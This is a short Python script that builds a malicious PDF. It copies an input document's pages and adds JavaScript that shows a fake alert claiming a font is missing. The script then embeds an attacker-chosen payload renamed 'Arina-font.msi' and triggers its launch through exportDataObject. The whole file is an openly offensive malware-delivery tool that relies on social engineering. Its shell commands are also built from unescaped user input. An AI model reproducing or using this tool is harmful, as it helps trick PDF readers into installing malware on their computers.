#!/usr/bin/python

from pypdf import PdfFileWriter
from pypdf import PdfFileReader
from pypdf.generic import DictionaryObject
import base64
import os
import argparse

parser = argparse.ArgumentParser(description='Personal information')
parser.add_argument('-i', dest='input', type=str)
parser.add_argument('-p', dest='payload', type=str)
parser.add_argument('-o', dest='output', type=str)

args = parser.parse_args()

def create_pdf():
    malicious_pdf = PdfFileWriter(args.output)
    with open(args.input, 'rb') as f:
        pdfReader = PdfFileReader(f)
        for page in range(pdfReader.numPages):
            pageObj = pdfReader.getPage(page)
            malicious_pdf.addPage(pageObj)
        malicious_pdf.addJS('app.alert("This document need a font that your computer didn\'t have, please install Arina-font following"); this.exportDataObject( {cName: "Arina-font.msi", nLaunch: 2} );')
        malicious_pdf.write()  
        malicious_pdf.close()
        f.close()

def insertMaliciousFiles():
    raw_payload = ''
    # Read contents of payload file
    with open(args.payload, "rb") as payload:
        raw_payload = payload.read()
    
    payload.close()

    tmp = open('Arina-font.msi', 'wb+')
    tmp.write(raw_payload)
    tmp.close()

    os.system('pdftk ' + args.output + ' attach_file Arina-font.msi output final.pdf')
    os.system('mv final.pdf ' + args.output)
    os.system('rm Arina-font.msi')
    
    print('Done')

create_pdf()
insertMaliciousFiles()
